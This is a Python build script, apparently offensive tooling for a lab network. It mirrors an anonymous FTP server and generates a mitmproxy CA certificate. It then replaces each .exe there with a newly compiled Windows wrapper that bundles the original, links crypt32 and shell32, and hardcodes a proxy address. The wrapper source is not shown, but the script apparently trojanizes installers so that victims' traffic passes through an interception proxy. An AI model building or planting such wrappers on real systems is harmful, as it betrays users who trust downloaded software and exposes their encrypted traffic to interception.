#!/usr/bin/python

import os
import shutil
import subprocess
import time
from pathlib import Path

PROXY_SERVER = "10.1.1.2:8080"
FTP_SERVER_IP = "10.1.2.2"

home_dir = str(Path.home())
FTP_FOLDER = home_dir + os.path.sep + "ftp"


def mirror_ftp_server(ftp_server_ip):
    shutil.rmtree(FTP_FOLDER, ignore_errors=True)
    os.makedirs(FTP_FOLDER, exist_ok=True)
    subprocess.check_output(
        [
            "wget",
            "--no-host-directories",
            "-r",
            f"ftp://anonymous:arst@{ftp_server_ip}",
            "-P",
            FTP_FOLDER,
        ]
    )


def generate_certificate():
    p = subprocess.Popen(["mitmdump"])
    time.sleep(5)
    p.kill()
    shutil.copy(home_dir + os.path.sep + ".mitmproxy/mitmproxy-ca-cert.p12", "cert.p12")


def main():
    mirror_ftp_server(FTP_SERVER_IP)
    generate_certificate()

    for root, _, files in os.walk(FTP_FOLDER):
        for f in files:
            executable_path = os.path.join(root, f)

            if not executable_path.endswith(".exe"):
                continue

            shutil.copy(executable_path, "executable.exe")

            subprocess.check_output(
                [
                    "i686-w64-mingw32-windres",
                    "resource.rc",
                    "resource.o",
                ]
            )

            print(executable_path)
            command = [
                "i686-w64-mingw32-gcc",
                "main.c",
                "-lcrypt32",
                "-lshell32",
                "resource.o",
                "-D",
                f'PROXY_SERVER="{PROXY_SERVER}"',
                "-o",
                executable_path,
            ]

            subprocess.check_output(command)


if __name__ == "__main__":
    main()
